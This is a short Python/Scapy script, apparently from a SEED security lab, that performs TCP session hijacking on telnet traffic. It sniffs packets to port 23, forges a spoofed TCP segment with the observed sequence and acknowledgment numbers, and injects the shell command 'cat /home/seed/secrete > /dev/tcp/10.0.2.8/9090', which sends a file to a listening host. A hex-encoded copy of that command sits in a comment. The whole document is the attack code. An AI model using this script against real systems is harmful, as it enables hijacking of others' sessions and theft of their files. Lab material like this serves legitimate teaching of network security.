#!/usr/bin/python
from scapy.all import *

def reset_pkt(pkt):
	src = pkt[IP].dst
	dst = pkt[IP].src
	newIP = IP()
	newIP.src = src
	newIP.dst = dst
	newTCP = TCP()
	newTCP.sport = pkt[TCP].sport
	newTCP.dport = 23
	newTCP.flags = 16
	newTCP.seq = pkt[TCP].seq
	newTCP.ack = pkt[TCP].ack
	newTCP.window = pkt[TCP].window
	newdata = Raw()
	#newdata.load = "0a636174202f686f6d652f736565642f73656372657465203e202f6465762f7463702f31302e302e322e382f393039300a"
	newdata.load = "cat /home/seed/secrete > /dev/tcp/10.0.2.8/9090"
	newPkt = newIP/newTCP/newdata
	ls(newPkt)
	send(newPkt,verbose=0)


pkt = sniff(filter='dst port 23', prn=reset_pkt)